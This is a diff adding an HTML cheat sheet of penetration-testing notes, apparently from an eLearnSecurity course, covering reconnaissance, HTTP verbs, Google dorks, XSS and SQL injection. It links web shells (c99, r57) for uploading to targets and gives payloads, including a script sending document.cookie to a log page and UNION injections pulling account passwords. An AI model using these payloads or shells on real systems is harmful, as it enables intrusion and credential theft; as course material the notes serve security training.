@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Pentester Utils</title>
+
+        <link rel="stylesheet" type="text/css" href="css/desert.css">
+        <script type="text/javascript" src="js/run_prettify.js?autoload=false"></script>
+
+        <style>
+            code.inline {
+                background-color: #aaa;
+                padding: 2px 5px 2px 5px;
+            }
+        </style>
+    </head>
+    <body onload="PR.prettyPrint()">
+        <h1>Table of Content</h1>
+        <ol>
+            <li><a href="#circular-process">Circular process</a></li>
+            <li><a href="#web-exploit">Web Exploit</a>
+                <ol>
+                    <li><a href="#we-shells">Shells</a></li>
+                    <li><a href="#we-fingerprinting">Web Server Fingerprinting</a>
+                        <ol>
+                            <li><a href="#we-fp-netcat">Netcat: for HTTP conections</a></li>
+                            <li><a href="#we-fp-openssl">OpenSSL: for HTTPS connections</a></li>
+                            <li><a href="#we-fp-httprint">Httprint</a></li>
+                        </ol>
+                    </li>
+                    <li><a href="#we-http-verbs">HTTP Verbs</a>
+                        <ol>
+                            <li><a href="#we-hv-get">GET</a></li>
+                            <li><a href="#we-hv-post">POST</a></li>
+                            <li><a href="#we-hv-put">PUT</a></li>
+                            <li><a href="#we-hv-delete">DELETE</a></li>
+                            <li><a href="#we-hv-options">OPTIONS</a></li>
+                        </ol>
+                    </li>
+                    <li><a href="#we-google-hack">Google Hacking</a></li>
+                    <li><a href="#we-xss">XSS: Cross-Site Scripting</a>
+                        <ol>
+                            <li><a href="#we-xss-common">Common XSS Codes</a></li>
+                        </ol>
+                    </li>
+                    <li><a href="#we-sql-injection">SQL Injection</a>
+                        <ol>
+                            <li><a href="#we-sqli-common">Common SQL Injections</a></li>
+                            <li><a href="#we-sqli-true-false">Check for True &amp; for False</a></li>
+                            <li><a href="#we-sqli-functions">Useful MySQL functions</a></li>
+                            <li><a href="#we-sqli-examples">Some crafted examples</a></li>
+                            <li><a href="#we-sqli-sqlmap">Automatize All! SQLMap</a></li>
+                        </ol>
+                    </li>
+                </ol>
+            </li>
+        </ol>
+
+        <br>
+        <h1 id="circular-process">Circular process</h1>
+        <p>The steps to follow in a circular manner</p>
+        <ol>
+            <li>Engagement</li>
+            <li>Information gathering
+                <ul>
+                    <li>Social Search
+                        <ul>
+                            <li>Company website</li>
+                            <li>Facebook <a href="https://www.facebook.com/search/all/">https://www.facebook.com/search/all/</a></li>
+                            <li>Twitter's Advanced Search <a href="https://twitter.com/search-advanced">https://twitter.com/search-advanced</a></li>
+                            <li>Gogole + <a href="https://plus.google.com/s">https://plus.google.com/s</a></li>
+                            <li>Linkedin's Advanced Search <a href="https://www.linkedin.com/vsearch/f?adv=true&trk=federated_advs">https://www.linkedin.com/vsearch/f?adv=true&amp;trk=federated_advs</a></li>
+                            <li>CrunchBase <a href="https://www.crunchbase.com/app/search">https://www.crunchbase.com/app/search</a></li>
+                        </ul>
+                    </li>
+                    <li>Whois:
+                        <br>
+<code class="prettyprint inline">
+$ whois host.com
+</code>
+                    </li>
+                </ul>
+            </li>
+            <li>Footprint &amp; Scanning</li>
+            <li>Vulnerability assessment</li>
+            <li>Exploitation</li>
+            <li>Reporting</li>
+        </ol>
+
+        <h1 id="web-exploit">Web Exploit</h1>
+
+        <h2 id="we-shells">Shells</h2>
+        <p>Upload this shells on the target web service to execute remote code</p>
+        <p>
+            To upload a shell trough the <b>PUT</b> command you have to know the size.
+            <br>
+            Use this command: <code class="prettyprint inline">$ wc -m shell.php</code>
+        </p>
+        <ul>
+            <li><b>my shell</b>: <a href="shells/myshell.txt">[TXT]</a> <a href="shells/myshell.php">[PHP]</a></li>
+            <li><b>c99 shell</b>: <a href="shells/c99.txt">[TXT]</a> <a href="shells/c99.php">[PHP]</a></li>
+            <li><b>c100 shell</b>: <a href="shells/c100.txt">[TXT]</a> <a href="shells/c100.php">[PHP]</a></li>
+            <li><b>r57 shell</b>: <a href="shells/r57.txt">[TXT]</a> <a href="shells/r57.php">[PHP]</a></li>
+        </ul>
+        <h2 id="we-fingerprinting">Web Server Fingerprinting</h2>
+        <p>Find which service is running and of which version</p>
+
+        <h3 id="we-fp-netcat">Netcat: for HTTP conections</h3>
+        <p>
+<pre class="prettyprint">
+<code>
+$ nc [-vv] &lt;target address&gt; &lt;port [80]&gt;
+HEAD / HTTP/1.0 &nbsp; # / is the requested page
+</code>
+</pre>
+        </p>
+        <p><b>AFTER THE <i>HEAD</i> YOU HAVE TO APPEND TWO EMPTY LINES</b></p>
+
+        <h3 id="we-fp-openssl">OpenSSL: for HTTPS connections</h3>
+        <p>
+<pre class="prettyprint">
+<code>
+$ openssl s_client -connect &lt;target.site&gt;:&lt;port [443]&gt;
+HEAD / HTTP/1.0 &nbsp; # / is the requested page
+</code>
+</pre>
+        </p>
+
+        <h3 id="we-fp-httprint">Httprint</h3>
+        <p>
+<pre class="prettyprint">
+<code>
+$ httprint -P0 -h &lt;target hosts&gt; s &lt;signature file&gt;
+</code>
+</pre>
+            <br>
+            <b>-P0</b>: avoid pinging the host <br>
+        </p>
+
+        <h2 id="we-http-verbs">HTTP Verbs</h2>
+        <p>
+            PRE: <b>HTTP/1.1</b> need the <b>Host</b> keyword on the second line, the <b>HTTP/1.0</b> doesn't
+        </p>
+        <ul>
+            <li><h3 id="we-hv-get">GET</h3>
+                <p>is used to request a resource</p>
+                <p>
+<pre class="prettyprint">
+<code>
+<b>GET</b> /page.php?course=PTS HTTP/1.1
+<b>Host</b>: www.example.site
+</code>
+</pre>
+                </p>
+            </li>
+            <li><h3 id="we-hv-post">POST</h3>
+                <p>is used to submit HTML form data</p>
+                <p>
+<pre class="prettyprint">
+<code>
+<b>POST</b> /login.php HTTP/1.1
+Host</b>: www.example.site
+
+
+username=john&amp;password=mypass
+</code>
+</pre>
+                </p>
+            </li>
+            <li><h3 id="we-hv-put">PUT</h3>
+                <p>is used to upload file to the server</p>
+                <p>
+<pre class="prettyprint">
+<code>
+<b>PUT</b> /path/to/destination HTTP/1.1
+Host</b>: www.example.site
+Content-type: text/html     [image/png]
+Content-length: 20
+
+
+&lt;PUT data&gt;
+</code>
+</pre>
+                </p>
+            </li>
+            <li><h3 id="we-hv-delete">DELETE</h3>
+                <p>is used to remove file from the server</p>
+                <p>
+<pre class="prettyprint">
+<code>
+<b>DELETE</b> /path/to/destination HTTP/1.1
+Host</b>: www.example.site
+</code>
+</pre>
+                </p>
+            </li>
+            <li><h3 id="we-hv-options">OPTIONS</h3>
+                <p>is used to query the web server to enable HTTP Verbs</p>
+                <p>
+<pre class="prettyprint">
+<code>
+<b>OPTIONS</b> / HTTP/1.1
+Host</b>: www.example.site
+</code>
+</pre>
+                </p>
+            </li>
+        </ul>
+
+        <h2 id="we-google-hack">Google Hacking (Google Dorks)</h2>
+        <p>Use of advanced parameters in Google search to obtain informations</p>
+        <table>
+            <thead>
+                <tr>
+                    <td><b>Command</b></td>
+                    <td><b>Meaning</b></td>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>site:</code></td>
+                    <td>incude only results on a given hostname</td>
+                </tr>
+                <tr>
+                    <td><code>intitle:</code></td>
+                    <td>filters according to the title of a page</td>
+                </tr>
+                <tr>
+                    <td><code>inurl:</code></td>
+                    <td>filters according to the url of a resource</td>
+                </tr>
+                <tr>
+                    <td><code>filetype:</code></td>
+                    <td>filters by using the file extension of a resource (.pdf, .xls)</td>
+                </tr>
+                <tr>
+                    <td><code>AND, OR, &amp;, |</code></td>
+                    <td>use logical operators to combine exressions</td>
+                </tr>
+                <tr>
+                    <td><code>-</code></td>
+                    <td>to filter out a keyword or a command's result from the query</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <p>
+            Example: <code class="inline">-inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf</code>
+            <br>
+            Excludes from the search results common web page extensions and looks for open directory indexed containing txt, doc or  pdf files.
+        </p>
+
+        <h2 id="we-xss">XSS: Cross-Site Scripting</h2>
+        <p>
+            Vulnerability that lets an attacker control some of the content of a web application.
+            <br>
+            You have to look at <b>every</b> user input.
+        </p>
+
+        Three types of XSS:
+        <ol>
+            <li>
+                <b>Reflected XSS</b>: when the injected text is reflected on the page (appears in the page)
+                <br>
+                <b><i>Chrome has a REFLECTED XSS FILTER built in. Always use FIREFOX!!!</i></b>
+            </li>
+            <li>
+                <b>Persistent XSS</b>: when the payload is sent to the vulnerable web server and the <b>stored</b>.
+            </li>
+            <li><b>DOM Based XSS</b>: -- NOT SEE IN COURSE --
+        </ol>
+
+        <h3 id="we-xss-common">Common XSS Codes</h3>
+        <p>This is a common string to test for XSS</p>
+<pre class="prettyprint">
+<code>
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code>
+</pre>
+    
+        <p>Or you can use something more adanced (you can pass every QueryString you want)</p>
+<pre class="prettyprint">
+<code>
+&lt;script&gt;
+  var i = new Image();
+  i.src="http://localhost/hack/log.php?cookie="+document.cookie;
+&lt;/script&gt;
+</code>
+</pre>
+        <p>It creates a file called <a href="http://localhost/hack/tools/log.txt">log.txt</a> with the logged activity
+
+        <h2 id="we-sql-injection">SQL Injection</h2>
+        <p>
+            Uses the same injection point of a XSS but to extract DataBase-related informations
+            <br>
+            You have to test <b>each and every</b> input:
+            <ul>
+                <li>GET parameters</li>
+                <li>POST parameters</li>
+                <li>HTTP Headers
+                    <ul>
+                        <li>User-Agent</li>
+                        <li>Cookie</li>
+                        <li>Accept</li>
+                        <li>...</li>
+                    </ul>
+                </li>
+            </ul>
+            with different combinations of:
+            <ul>
+                <li>String terminators: ' and "</li>
+                <li>SQL commands: <b>SELECT</b>, <b>UNION</b> and others</li>
+                <li>SQL comments: <b>#</b> or <b>--</b></li>
+            </ul>
+
+            It is always useful to add a comment at the end of the injection to filter out all the official query data.
+            <code class="inline"><b> -- -</b></code>
+        </p>
+
+        <h3 id="we-sqli-common">Common SQL Injections</h3>
+        <ul>
+            <li>
+                <b>Example 1: Basic usage</b>
+                Correct query:
+<pre class="prettyprint">
+<code>
+SELECT Name, Description FROM Products WHERE ID='$id';
+</code>
+</pre>
+                Crafted <code><b>$id</b></code>
+<pre class="prettyprint">
+<code>
+' OR 'a'='a'
+</code>
+</pre>
+                Resulting query (extracts all the data from the <b>Products</b> table because the boolean query is always True!!):  
+<pre class="prettyprint">
+<code>
+SELECT Name, Description FROM Products WHERE ID='<b>' OR 'a'='a'</b>;
+</code>
+</pre>
+            </li>
+            <li>
+                <b>Example 2: The UNION command</b>
+                Correct query:
+<pre class="prettyprint">
+<code>
+SELECT Name, Description FROM Products WHERE ID='$id';
+</code>
+</pre>
+                Crafted <code><b>$id</b></code>
+<pre class="prettyprint">
+<code>
+' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a'
+</code>
+</pre>
+                Resulting query (extracts all the data from the <b>Accounts</b> table because of the UNION):    
+<pre class="prettyprint">
+<code>
+SELECT Name, Description FROM Products WHERE ID='<b>' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a'</b>;
+</code>
+</pre>
+            </li>
+        </ul>
+
+        <h3 id="we-sqli-true-false">Check for True &amp; for False</h3>
+        <p>
+            You have to check for the <b>True</b> condition to check if the injection is possible. But you have also to check for the <b>False</b> condition to understand when the injection fails.
+        </p>
+
+        <h3 id="we-sqli-functions">Useful MySQL functions</h3>
+        <ul>
+            <li>
+                <b>user()</b>: extracts the current user connected to the DB
+<pre class="prettyprint">
+<code>
+<b>mysql> select user();</b>
++----------------+
+| user()         |
++----------------+
+| root@localhost |
++----------------+
+</code>
+</pre>
+            </li>
+            <li>
+                <b>substring()</b>: obvious (input string, position, length)
+<pre class="prettyprint">
+<code>
+<b>mysql> select substring('mysupercoolstring', 2, 3);</b>
++---------------------------------------+
+| substring('mysupercoolstring', 2, 3); |
++---------------------------------------+
+| ysu                                   |
++---------------------------------------+
+</code>
+</pre>
+            </li>
+            <li>
+                this functions can be mixed and converted to Boolean result:
+<pre class="prettyprint">
+<code>
+<b>mysql> select substring(user(), 1, 1) = 'r';</b>
++---------------------------------------+
+| select substring(user(), 1, 1) = 'r'; |
++---------------------------------------+
+|                                     1 |
++---------------------------------------+
+</code>
+</pre>
+            </li> 
+            <li>
+                or UNION-based injections:
+<pre class="prettyprint">
+<code>
+<b>mysql> select substring(user(), 1, 1) = 'r';</b>
++---------------------------------------+
+| select substring(user(), 1, 1) = 'r'; |
++---------------------------------------+
+|                                     1 |
++---------------------------------------+
+</code>
+</pre>
+            </li> 
+        </ul>
+
+        <h3 id="we-sqli-examples">Some crafted examples</h3>
+        Always the same query:
+<pre class="prettyprint">
+<code>
+SELECT Name, Description FROM Products WHERE ID='$id';
+</code>
+</pre>
+        Crafted <code><b>$id</b></code>
+<pre class="prettyprint">
+<code>
+' UNION SELECT user(); -- -
+</code>
+</pre>
+        use <b>null</b>s for the query untill the result is True. It's used to understand the structure of the query
+<pre class="prettyprint">
+<code>
+' UNION SELECT null, null; -- -
+</code>
+</pre>
+    
+        <h3 id="we-sqli-sqlmap">Automatize All! SQLMap</h3>
+        <p>Basic usage</p>
+<pre class="prettyprint">
+<code>
+$ sqlmap -u &lt;URL&gt; -p &lt;injection parameter&gt; [options]
+</code>
+</pre>
+        <b>[options]</b> may be <code class="inline">--technique=U</code> that tells SQLMap to use a UNION based SQL injection technique.
+
+
+<br><br><br>
+        SQL Injection: <a href="https://members.elearnsecurity.com/course/70000/74000/74010/3/index.html">Video eLearnSecurity</a>
+        <br>
+        SLQMap: <a href="https://members.elearnsecurity.com/course/70000/74000/74010/4/index.html">Video eLearnSecurity</a>
+    </body>
+</html>
